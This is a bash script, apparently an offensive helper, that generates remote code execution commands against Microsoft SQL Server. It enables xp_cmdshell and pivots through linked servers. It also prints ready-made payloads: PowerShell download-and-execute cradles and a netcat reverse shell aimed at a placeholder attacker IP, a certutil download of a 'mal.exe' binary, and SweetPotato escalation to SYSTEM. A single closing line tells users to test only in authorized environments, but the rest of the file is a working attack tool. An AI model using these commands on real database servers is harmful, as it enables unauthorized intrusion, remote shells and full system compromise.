#!/bin/bash
# MSSQL RCE Helper Script
# Usage: ./mssql-rce.sh <target> [options]

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

TARGET=""
USERNAME=""
PASSWORD=""
DOMAIN=""
COMMAND="whoami"
METHOD="xp_cmdshell"

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target)
            TARGET="$2"
            shift 2
            ;;
        -u|--username)
            USERNAME="$2"
            shift 2
            ;;
        -p|--password)
            PASSWORD="$2"
            shift 2
            ;;
        -d|--domain)
            DOMAIN="$2"
            shift 2
            ;;
        -c|--command)
            COMMAND="$2"
            shift 2
            ;;
        -m|--method)
            METHOD="$2"
            shift 2
            ;;
        -h|--help)
            echo "MSSQL RCE Helper"
            echo "Usage: $0 -t <target> [options]"
            echo ""
            echo "Options:"
            echo "  -t, --target       Target MSSQL server (required)"
            echo "  -u, --username     Username"
            echo "  -p, --password     Password"
            echo "  -d, --domain       Domain"
            echo "  -c, --command      Command to execute (default: whoami)"
            echo "  -m, --method       RCE method: xp_cmdshell, openquery, execute (default: xp_cmdshell)"
            echo "  -h, --help         Show this help"
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

if [[ -z "$TARGET" ]]; then
    echo -e "${RED}Error: Target is required${NC}"
    exit 1
fi

echo -e "${GREEN}[*] MSSQL RCE Helper${NC}"
echo -e "${YELLOW}[+] Target: $TARGET${NC}"
echo -e "${YELLOW}[+] Command: $COMMAND${NC}"
echo -e "${YELLOW}[+] Method: $METHOD${NC}"

echo ""
echo -e "${BLUE}[+] Step 1: Check if xp_cmdshell is enabled${NC}"
echo "SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';"
echo ""

echo -e "${BLUE}[+] Step 2: Enable xp_cmdshell (if disabled)${NC}"
echo "sp_configure 'show advanced options', 1; reconfigure;"
echo "sp_configure 'xp_cmdshell', 1; reconfigure;"
echo ""

echo -e "${BLUE}[+] Step 3: Execute command via xp_cmdshell${NC}"
echo "exec xp_cmdshell '$COMMAND';"
echo ""

echo -e "${BLUE}[+] Alternative: PowerShell execution${NC}"
echo "exec xp_cmdshell 'powershell -w hidden -enc [base64_encoded_payload]';"
echo ""

echo -e "${BLUE}[+] Alternative: Download and execute script${NC}"
echo 'exec xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString('"'"'http://<attacker_ip>:8080/evil.ps1'"'"')"';'
echo ""

echo -e "${BLUE}[+] Via OPENQUERY (trusted links)${NC}"
echo 'SELECT * FROM OPENQUERY("<linked_server>", '"'"'exec xp_cmdshell '"'"''"'"'$COMMAND'"'"''"'"')'"'"');'
echo ""

echo -e "${BLUE}[+] Via EXECUTE (trusted links)${NC}"
echo "EXECUTE('EXECUTE('"'"'sp_configure '"'"''"'"'xp_cmdshell'"'"''"'"',1;reconfigure;"'"''"'"') AT "<linked_server>"') AT "<current_server>";"
echo ""

echo -e "${BLUE}[+] PowerUpSQL method${NC}"
echo "Invoke-SQLOSCmd -Instance '$TARGET' -Command '$COMMAND' -RawResults"
echo ""

echo -e "${BLUE}[+] MSSQLPwner method${NC}"
echo "mssqlpwner $TARGET -windows-auth direct-query \"exec xp_cmdshell '$COMMAND'\""
echo ""

echo -e "${BLUE}[+] Common RCE payloads${NC}"
echo ""
echo "# Reverse shell (netcat)"
echo "exec xp_cmdshell 'nc -e cmd.exe <attacker_ip> 4444';"
echo ""
echo "# Reverse shell (PowerShell)"
echo "exec xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString('"'"'http://<attacker_ip>/rev.ps1'"'"')"';"
echo ""
echo "# Download and execute from remote"
echo "exec xp_cmdshell 'certutil -urlcache -f http://<attacker_ip>/mal.exe C:\\temp\\mal.exe';"
echo "exec xp_cmdshell 'C:\\temp\\mal.exe';"
echo ""

echo -e "${BLUE}[+] Privilege escalation after RCE${NC}"
echo ""
echo "# Check current user"
echo "exec xp_cmdshell 'whoami';"
echo ""
echo "# Check for SeImpersonatePrivilege (MSSQL service account)"
echo "# Use SweetPotato to escalate to SYSTEM"
echo "execute-assembly SweetPotato.dll <service_name> <output_token>"
echo ""

echo -e "${GREEN}[*] RCE commands generated${NC}"
echo -e "${YELLOW}[!] Remember to test in authorized environments only${NC}"
